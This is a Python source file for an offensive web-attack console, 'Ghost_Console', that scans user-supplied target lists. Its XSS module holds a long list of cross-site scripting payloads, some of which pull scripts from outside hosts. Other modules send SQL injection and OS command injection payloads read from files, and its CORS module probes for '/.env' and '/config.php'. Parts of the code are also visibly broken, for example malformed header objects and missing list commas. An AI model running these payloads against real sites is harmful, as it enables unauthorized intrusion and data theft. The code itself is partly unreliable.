import os
import requests
from colorama import Fore, Style, init
from pyfiglet import Figlet
import warnings
warnings.filterwarnings("ignore")

from sqli_error_messages import sqli_error_messages

init(autoreset=True)

f = Figlet(font='slant')
banner = f.renderText('Ghost_Console')

print(Fore.RED + Style.BRIGHT + banner)

print(Fore.RED + Style.BRIGHT + "=" * 60)
print(Fore.RED + Style.BRIGHT + "   ☠  DEV BY : BLACK FALCON  ☠")
print(Fore.RED + Style.BRIGHT + "   ⚠  USE FOR EDUCATIONAL PURPOSE ONLY ⚠")
print(Fore.RED + Style.BRIGHT + "=" * 60)

print(Fore.YELLOW + Style.BRIGHT +
      "\n[!] Keep this tool updated\n"
      "[+] Github : https://github.com/BlackFalcon-cloud\n")

print(Fore.CYAN + Style.BRIGHT + "[*] Current Version : V1.0\n")



user_input = input(
    Fore.LIGHTMAGENTA_EX +
    "1. XSS (Cross Site Scripting)\n"
    "2. SQL-i (Structured Query Lang Injection)\n"
    "3. CORS (Cross Origin Resources Sharing Misconfigured)(Exploit)\n"
    "4. OS Command Injection (Exploit)\n"
    "5. LFI Local File Inclusion (Exploit)\n"
    "6. RFI Remote File Inclusion (Exploit)\n"
    "7. Path Traversal (Exploit)\n"
    "8. Open Redirect (Exploit)\n"
    "9. Github Recon (Scanner)\n"
    "Enter Number To Choice: " +
    Style.RESET_ALL
)


if "1" in user_input:
 f = Figlet(font='Slant')
 print (f.renderText('KILL-XSS'))
 print(Fore.BLACK,"Dev By Captain 3xpl01t3r \n X Teambdcyberninja")



 User_xss = input("Enter Your Parameter urls file path: \n")

 try:
     with open(User_xss, "r") as file:
      targets = [line.strip() for line in file if line.strip()]
 except:
     print("File Not Found!")
     exit()

 xss_payloads = [
    # Basic / Polyglot
    '"><svg/onload=alert(1)>//',
    "';alert(1);//</script><svg onload=alert(1)>",
    '</script><img src=x onerror=alert(1)><!--',
    '";}</script><svg/onload=alert(1)>',
    "alert`1`",
    "alert&lpar;1&rpar;",
    "alert&#x28;1&#x29",
    "alert&#40;1&#41",
    "(alert)(1)",
    "a=alert,a(1)",
    "[1].find(alert)",
    """top["al"+"ert"](1)""",
    "top[/al/.source+/ert/.source](1)",
    "al\u0065rt(1)",
    "top['al\145rt'](1)",
    "top['al\x65rt'](1)",
    "top[8680439..toString(30)](1)",
    "navigator.vibrate(500)",
    "eval(URL.slice(-8))>#alert(1)",
    "eval(location.hash.slice(1)>#alert(1)",
    "innerHTML=location.hash>#<script>alert(1)</script>",
        """<svg onload=alert(1)>""",
    """><svg onload=alert(1)//""",
    """"onmouseover=alert(1)//""",
    """"autofocus/onfocus=alert(1)//""",
    """'-alert(1)-'""",
    """'-alert(1)//""",
    """\\'-alert(1)//""",
    """</script><svg onload=alert(1)>""",
    """<x contenteditable onblur=alert(1)>lose focus!""",
    """<x onclick=alert(1)>click this!""",
    """<x oncopy=alert(1)>copy this!""",
    """<x oncontextmenu=alert(1)>right click this!""",
    """<x oncut=alert(1)>copy this!""",
    """<x ondblclick=alert(1)>double click this!""",
    """<x ondrag=alert(1)>drag this!""",
    """<x contenteditable onfocus=alert(1)>focus this!""",
    """<x contenteditable oninput=alert(1)>input here!""",
    """<x contenteditable onkeydown=alert(1)>press any key!""",
    """<x contenteditable onkeypress=alert(1)>press any key!""",
    """<x contenteditable onkeyup=alert(1)>press any key!""",
    """<x onmousedown=alert(1)>click this!""",
    """<x onmousemove=alert(1)>hover this!""",
    """<x onmouseout=alert(1)>hover this!""",
    """<x onmouseover=alert(1)>hover this!""",
    """<x onmouseup=alert(1)>click this!""",
    """<x contenteditable onpaste=alert(1)>paste here!""",
    """<script>alert(1)//""",
    """<script>alert(1)<!–""",
    """<script src=//brutelogic.com.br/1.js>""",
    """<script src=//3334957647/1>""",
    """%3Cx onxxx=alert(1)""",
    """<%78 onxxx=1""",
    """<x %6Fnxxx=1""",
    """<x o%6Exxx=1""",
    """<x on%78xx=1""",
    """<x onxxx%3D1""",
    """<X onxxx=1""",
    """<x OnXxx=1""",
    """<X OnXxx=1""",
    """<x onxxx=1 onxxx=1""",
    """<x/onxxx=1""",
    """<x%09onxxx=1""",
    """<x%0Aonxxx=1""",
    """<x%0Conxxx=1""",
    """<x%0Donxxx=1""",
    """<x%2Fonxxx=1""",
    """<x 1='1'onxxx=1""",
    """<x 1="1"onxxx=1""",
    """<x </onxxx=1""",
    """<x 1=">" onxxx=1""",
    """<http://onxxx%3D1/""",
    """<x onxxx=alert(1) 1='""",
    """<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>""",
    """'onload=alert(1)><svg/1='""",
    """'>alert(1)</script><script/1='""",
    """*/alert(1)</script><script>/*""",
    """*/alert(1)">'onload="/*<svg/1='""",
    """`-alert(1)">'onload="`<svg/1='""",
    """*/</script>'>alert(1)/*<script/1='""",
    """<script>alert(1)</script>""",
    """<script src=javascript:alert(1)>""",
    """<iframe src=javascript:alert(1)>""",
    """<embed src=javascript:alert(1)>""",
    """<a href=javascript:alert(1)>click""",
    """<math><brute href=javascript:alert(1)>click""",
    """<form action=javascript:alert(1)><input type=submit>""",
    """<isindex action=javascript:alert(1) type=submit value=click>""",
    """<form><button formaction=javascript:alert(1)>click""",
    """<form><input formaction=javascript:alert(1) type=submit value=click>""",
    """<form><input formaction=javascript:alert(1) type=image value=click>""",
    """<form><input formaction=javascript:alert(1) type=image src=SOURCE>""",
    """<isindex formaction=javascript:alert(1) type=submit value=click>""",
    """<object data=javascript:alert(1)>""",
    """<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>""",
    """<svg><script xlink:href=data:,alert(1) />""",
    """<math><brute xlink:href=javascript:alert(1)>click""",
    """<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>""",
    """<html ontouchstart=alert(1)>""",
    """<html ontouchend=alert(1)>""",
    """<html ontouchmove=alert(1)>""",
    """<html ontouchcancel=alert(1)>""",
    """<body onorientationchange=alert(1)>""",
    """><img src=1 onerror=alert(1)>.gif""",
    """<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>""",
    """GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;""",
    """<script src="data:&comma;alert(1)//""",
    """><script src=data:&comma;alert(1)//""",
    """<script src="//brutelogic.com.br&sol;1.js&num;""",
    """><script src=//brutelogic.com.br&sol;1.js&num;""",
    """<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;""",
    """><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;""",
    """<base href=//0>""",
    """<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)""",
    """<body onload=alert(1)>""",
    """<body onpageshow=alert(1)>""",
    """<body onfocus=alert(1)>""",
    """<body onhashchange=alert(1)><a href=#x>click this!#x""",
    """<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x""",
    """<body onscroll=alert(1)><br><br><br><br>""",
    """<body onresize=alert(1)>press F12!""",
    """<body onhelp=alert(1)>press F1! (MSIE)""",
    """<marquee onstart=alert(1)>""",
    """<marquee loop=1 width=0 onfinish=alert(1)>""",
    """<audio src onloadstart=alert(1)>""",
    """<video onloadstart=alert(1)><source>""",
    """<input autofocus onblur=alert(1)>""",
    """<keygen autofocus onfocus=alert(1)>""",
    """<form onsubmit=alert(1)><input type=submit>""",
    """<select onchange=alert(1)><option>1<option>2""",
    """<menu id=x contextmenu=x onshow=alert(1)>right click me!""",
    
    """<script>alert('XSS')</script>""",
    """<scr<script>ipt>alert('XSS')</scr<script>ipt>""",
    """><script>alert('XSS')</script>""",
    """><script>alert(String.fromCharCode(88,83,83))</script>""",
    """<img src=x onerror=alert('XSS');>""",
    """<img src=x onerror=alert(String.fromCharCode(88,83,83));>""",
    """<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>""",
    """<img src=x:alert(alt) onerror=eval(src) alt=xss>""",
    """><img src=x onerror=alert('XSS');>""",
    """><img src=x onerror=alert(String.fromCharCode(88,83,83));>""",
    """<svg/onload=alert('XSS')>""",
    """<svg/onload=alert(String.fromCharCode(88,83,83))>""",
    """<svg id=alert(1) onload=eval(id)>""",
    """><svg/onload=alert(String.fromCharCode(88,83,83))>""",
    """><svg/onload=alert(/XSS/)>""",
    """<body onload=alert(/XSS/.source)>""",
    """<input autofocus onfocus=alert(1)>""",
    """<select autofocus onfocus=alert(1)>""",
    """<textarea autofocus onfocus=alert(1)>""",
    """<keygen autofocus onfocus=alert(1)>""",
    """<video/poster/onerror=alert(1)>""",
    """<video><source onerror="javascript:alert(1)">""",
    """<video src=_ onloadstart="alert(1)">""",
    """<details/open/ontoggle="alert`1`">""",
    """<audio src onloadstart=alert(1)>""",
    """<marquee onstart=alert(1)>""",
    """<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">""",
    """<meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>""",
    """data:text/html,<script>alert(0)</script>""",
    """data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+""",
    """jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e""",
    """"></script><script>alert(1)</script>""",
    """';alert(String.fromCharCode(88,83,83))//""",
    """';alert(String. fromCharCode(88,83,83))//""",
    """";alert(String.fromCharCode (88,83,83))//""",
    """";alert(String.fromCharCode(88,83,83))//-- >""",
    """</SCRIPT>"><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>""",
    """javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*""",
    """javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a""",
    """javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/""",
    """javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*""",
    """javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*""",
    """javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//""",
    """javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*""",
    """--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*""",
    """/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*""",
    """javascript://--></title></style></textarea></script><svg "//' onclick=alert()//""",
    """/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*""",
    """<object onafterscriptexecute=confirm(0)>""",
    """<object onbeforescriptexecute=confirm(0)>""",
    """<script>window['alert'](document['domain'])<script>""",
    """<img src='1' onerror/=alert(0) />""",
    """<script>window</script>""",
    """<script>parent</script>""",
    """<script>self</script>""",
    """<script>top</script>""",
    """<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />""",
    """<img src=1 alt=al lang=ert onerror=top>""",
    """<script>$=1,alert($)</script>""",
    """<script ~~~>confirm(1)</script ~~~>""",
    """</style></scRipt><scRipt>alert(1)</scRipt>""",
    """<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>""",
    
    """%3Cimg/src=%3Dx+onload=alert(2)%3D""",
    """';confirm('XSS')//1491b2as""",
    """<scr&#x9ipt>alert('XSS')</scr&#x9ipt>""",
    """" onerror=alert()1 a=" """,
    """style=xss:expression(alert(1))""",
    """<input type=text value=“XSS”>""",
    """A” autofocus onfocus=alert(“XSS”)//""",
    """<input type=text value=”A” autofocus onfocus=alert(“XSS”)//”>""",
    """<a href="javascript:alert(1)">ssss</a>""",
    """+ADw-p+AD4-Welcome to UTF-7!+ADw-+AC8-p+AD4-""",
    """+ADw-script+AD4-alert(+ACc-utf-7!+ACc-)+ADw-+AC8-script+AD4-""",
    """+ADw-script+AD4-alert(+ACc-xss+ACc-)+ADw-+AC8-script+AD4-""",
    """</b style="expr/**/ession(alert('vulnerable'))">""",
    """'';!--"<XSS>=&{()}""",
    """<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>""",
    """<IMG SRC="javascript:alert('XSS');">""",
    """<IMG SRC=javascript:alert('XSS')>""",
    """<IMG SRC=JaVaScRiPt:alert('XSS')>""",
    """<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>""",
    """<IMG "><SCRIPT>alert("XSS")</SCRIPT>">""",
    """<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>""",
    """<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>""",
    """<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>""",
    """<IMG SRC="jav    ascript:alert('XSS');">""",
    """<IMG SRC="jav&#x09;ascript:alert('XSS');">""",
    """<IMG SRC="jav&#x0A;ascript:alert('XSS');">""",
    """<IMG SRC="jav&#x0D;ascript:alert('XSS');">""",
    """<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>""",
    """<<SCRIPT>alert("XSS");//<</SCRIPT>""",
    """<iframe src=http://ha.ckers.org/scriptlet.html <""",
    """<SCRIPT>a=/XSS/;alert(a.source)</SCRIPT>""",
    """</TITLE><SCRIPT>alert("XSS");</SCRIPT>""",
    """<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">""",
    """<BODY BACKGROUND="javascript:alert('XSS')">""",
    """<BODY ONLOAD=alert('XSS')>""",
    """<IMG DYNSRC="javascript:alert('XSS')">""",
    """<IMG LOWSRC="javascript:alert('XSS')">""",
    """<BGSOUND SRC="javascript:alert('XSS');">""",
    """<LINK REL="stylesheet" HREF="javascript:alert('XSS');">""",
    """<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>""",
    """<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>""",
    """<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE>""",
    """<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">""",
    """<IFRAME SRC="javascript:alert('XSS');"></IFRAME>""",
    """<DIV STYLE="background-image: url(javascript:alert('XSS'))">""",
    """<DIV STYLE="width: expression(alert('XSS'));">""",
    """<STYLE TYPE="text/javascript">alert('XSS');</STYLE>""",
    """<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->""",
    """<BASE HREF="javascript:alert('XSS');//">""",
    """<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>""",
    """<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>""",
    """<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">""",
    """<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>""",
    """<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>""",
    """<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>""",
    """<xss STYLE="behavior: url(xss.htc);">""",
    """javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*""",
    """javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a""",
    """javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/""",
    """javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*""",
    """javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*""",
    """--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*""",
    """/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*""",
    """javascript://--></title></style></textarea></script><svg "//' onclick=alert()//""",
    """/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*""",




    # Obfuscated
    '<svg><script>alert&#40;1&#41;</script>',
    "<img src=x onerror=window>",
    "<svg onload=top>",

    # Attribute-based
    '" autofocus onfocus=alert(1) x="',
    '" onpointerenter=alert(1) x="',


    # DOM XSS (SPA / hash / search)
    '#"><svg onload=alert(1)>',
    "';location.hash&&alert(1);//"
 ] 


 ERROR_KEYWORDS = [
    "error", "exception", "warning", "fatal", "traceback",
    "internal server error", "sql syntax", "mysql", "oracle",
    "postgres", "sqlite", "unterminated string",
    "template error", "jinja", "twig", "expression",
    "no such file", "failed to open", "permission denied",
    "access denied", "unauthorized", "forbidden",
    "invalid json", "parse error", "unexpected token",
    "connection refused", "timeout"
 ]

 header = {
    "User-Agent":"Mozilla/5.0",
    "User-Agent":"Team-Ghost/1.0"
 }


 print(Fore.CYAN,"[+]",Fore.RED,"[INFO]",Fore.BLUE,"Scanning please wait for result!")
 print (f"""------------------------------------------------------------------------------------------------------\n
                   Total Payload Loaded: {len(xss_payloads)}\n----------------------------------------------------------------------------------------------""")

 for payloads in xss_payloads:
    for target in targets:
        if "=" in target:
          target = target.split("=", 1)[0] + "="

        final_p = target+payloads
        try:
           org_get = requests.get(target,
                                  headers=header, 
                                  timeout=5)
           org_len = len(org_get.text)

           main_get = requests.get(final_p,
                                   headers=header,
                                   timeout=5)
           main_len = len(main_get.text)
           

           if org_len != main_len:
                    if payloads in main_get.text:
                     print(Fore.CYAN,"[+]",Fore.RED,"[INF]",Fore.GREEN,"XSS Triggered Possible XSS vulnerable","\n",
                        "URL:",target+payloads,"\n"
                        "Payload:",payloads, "\n"
                        "Status Code (If Defferece From 200 Please check manually):",main_get.status_code, "\n"
                        "Length :", main_len, "\n")
                     
           for error in ERROR_KEYWORDS:
             if error in main_get.text:
                  print(Fore.CYAN,"[+]",Fore.RED,"[INF]",Fore.GREEN,"Possible XSS Detected with error key, Manual Check required","\n","URL:",target+payloads)
           else:
                print(Fore.RED,"Not Vulnerable:",target)
                    

        except:
           print("Good Bye")
           exit()


if "2" in user_input:
   try:
     f = Figlet(font='slant')
     banner = f.renderText('SQL-i Scanner')
     print(banner,"\n","Dev By Black Falcon")



     header = {
        "User-Agent":"Mozilla/5.0"
     }
     user_sqli = input("enter set your target file path: \n")
     with open(user_sqli, "r") as t:
      targets = [line.strip() for line in t if line.strip()]

      with open("payloads/sqli.txt", "r") as sqli:
         sqli_payloads = [line.strip() for line in sqli if line.strip()]

         for target in targets:
            for sqli_payload in sqli_payloads:
               if "=" in target:
                  target = target.split("=", 1)[0] + "="

               sqli_main = requests.get(target,
                                        headers=header,
                                        timeout=5)
               sqli_len = len(sqli_main.text)

               #requests with sqli payload==>
               sqli_mal = target+sqli_payload
               sqli_req = requests.get(sqli_mal,
                                       headers=header,
                                       timeout=5)
               mal_len = len(sqli_req.text)

               if sqli_len != mal_len:
                    print(Fore.CYAN,"[+]",Fore.RED,"[INF]",Fore.GREEN,"POSSIBLE SQL-i VULNERABLE \n"
                          "URL:",target+sqli_payload,"\n"
                          "Payload:",sqli_payload)
                          
               for error in sqli_error_messages:
                  if error in sqli_req.text:
                    print(Fore.CYAN,"[+]",Fore.RED,"[INF]",Fore.GREEN,"POSSIBLE SQL-i VULNERABLE VIA ERROR MESSAGE \n"
                          "URL:",target,"\n"
                          "Payload:",sqli_payload)
                    
               else:
                  print(Fore.RED,"Not Vulnerable:",target)

   except:
     print("requests send failed! \n" \
     "good  Bye")
     exit()


cors_header_list = [
   "Access-Control-Allow-Origin: *",
   "Access-Control-Allow-Origin: https://evil.com",
   "Access-Control-Allow-Credentials: true"
]

cors_header = {
   "origin":"http://127.0.0.1"
}

if "3" in user_input:
   try:
      f = Figlet(font='slant')
      banner = f.renderText('CORS Exploiter')
      print(banner,"\n","Dev By Black Falcon")
      print("""Before exploit your need a script for hosting localhost server \n
            Go to Github account for exploitation javascript: https://github.com/BlackFalcon-cloud \n
            Please Donate us for more Tools creation. This method is chain attack. \n
            Regards,\n
            Black Falcon""")
   
      cors_target_file = input("Enter Your Domain List to scan: \n")
      with open(cors_target_file, "r") as cors:
         targets = [line.strip() for line in cors if line.strip()]

         for target in targets:
            for cors_payload in cors_header:


               get_req = requests.get(target,
                                      headers=cors_header,
                                      timeout=5)
               success_header = get_req.headers
               print(success_header)
               
               if cors_payload in success_header:
                  print(Fore.CYAN,"[+]",Fore.BLUE,"[INF]",Fore.GREEN,"CORS Vulnerable \n" \
                  "URL:",target)


               else:
                  print(Fore.RED,"Not Vulnerable")


                  corsPayload = [
                     "/.env"
                     "/config.php"
                  ]

                  local_host_receiver = [
                     "http://127.0.0.1"
                  ]

                  for corspayloads in corsPayload:
                     for local_server in local_host_receiver:
                        main_exploitation = local_server+corspayloads
                        main_header = {
                           main_exploitation
                        }
                        go_for_req = requests.get(target,
                                                  headers=main_header,
                                                  timeout=5)
   except:
      print("\n good bye")
      exit()



if "4" in user_input:
   try:
       f = Figlet(font='slant')
       banner = f.renderText('OS Command Injector')
       print(banner,"\n","Dev By Black Falcon")

       user_os_target = input("Enter Your Target File Path: \n")
       with open(user_os_target, "r") as ostarget:
         osTargets = [line.strip() for line in ostarget if line.strip()]

       with open("payloads/os-commands.txt", "r") as ospayload:
         ospayloads = [line.strip() for line in ospayload if line.strip()]

       for os_cmd_injection in ospayloads:
         for osTarget in osTargets:
            if "=" in osTarget:
             osTarget = osTarget.split("=", 1)[0] + "="
            os_req_main = requests.get(osTarget,
                                       headers={"User-Agent":"Mozila/5.0"},
                                       timeout=5)
            main_len = len(os_req_main.text)

            final_os = osTarget+os_cmd_injection
            os_req_payload = requests.get(final_os,
                                          headers={"User-Agent":"Mozila/5.0"},
                                          timeout=5)
            
            os_payload_len = len(os_req_payload.text)

            if main_len != os_payload_len:
               print(Fore.CYAN,"[+]",Fore.RED,"[INF]",Fore.GREEN,"Possible OS Command injected ! Manually Check Require.\n" \
               "URL:",osTarget+os_cmd_injection,"\n" \
               "Command:",os_cmd_injection)

            else:
               print(Fore.RED,"Not Vulnerable:",osTarget)
   except:
      print("Request Send Failed \n Good Bye!")


if "5" in user_input:
   f = Figlet(font='slant')
   banner = f.renderText('LFI')
   print(banner,"\n","Dev By Black Falcon")
   try:
      print("Currently Not Available, Please Be updated!")

   except:
      print("Good Bye!")



if "6" in user_input:
   f = Figlet(font='slant')
   banner = f.renderText('RFI')
   print(banner,"\n","Dev By Black Falcon")
   try:
      print("Currently Not Available, Please Be updated!")

   except:
      print("Good Bye!")




if "7" in user_input:
   f = Figlet(font='slant')
   banner = f.renderText('Path Traversal')
   print(banner,"\n","Dev By Black Falcon")
   try:
      print("Currently Not Available, Please Be updated!")

   except:
      print("Good Bye!")


if "8" in user_input:
   f = Figlet(font='slant')
   banner = f.renderText('Open Redirect exploit')
   print(banner,"\n","Dev By Black Falcon")
   try:
      print("Currently Not Available, Please Be updated!")

   except:
      print("Good Bye!")



if "9" in user_input:
   f = Figlet(font='slant')
   banner = f.renderText('Github Recon')
   print(banner,"\n","Dev By Black Falcon")
   try:
      print("Currently Not Available, Please Be updated!")

   except:
      print("Good Bye!")